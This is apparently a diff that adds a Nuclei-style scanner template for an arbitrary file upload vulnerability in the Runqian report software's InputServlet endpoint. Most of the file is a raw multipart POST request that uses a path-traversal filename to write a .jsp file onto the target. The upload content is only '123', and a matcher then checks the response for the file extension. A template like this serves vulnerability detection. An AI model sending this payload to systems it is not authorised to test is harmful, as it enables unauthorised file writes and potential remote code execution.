@@ -1,0 +1,40 @@
+id: qiankun-InputServlet-upload
+info:
+  name: Template Name
+  author: apple
+  severity: critical
+  description: 润乾报表InputServlet存在任意文件上传漏洞
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E6%B6%A6%E4%B9%BE%E6%8A%A5%E8%A1%A8InputServlet%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+    - https://mp.weixin.qq.com/s/-u1fn_q4e-YhJUEqwNG1Zg
+  tags: tags
+
+variables:
+  filename: "{{rand_base(6)}}"
+
+http:
+  - raw:
+      - |-
+        POST /InputServlet?action=12 HTTP/1.1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+        Content-Type: multipart/form-data; boundary=00content0boundary00
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Content-Length: 241
+        Connection: close
+
+        --00content0boundary00
+        Content-Disposition: form-data; name="upsize"
+
+        1024
+        --00content0boundary00
+        Content-Disposition: form-data; name="file"; filename="/\..\\..\\..\{{filename}}.jsp"
+        Content-Type: image/jpeg
+
+        123
+        --00content0boundary00--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '.jsp'
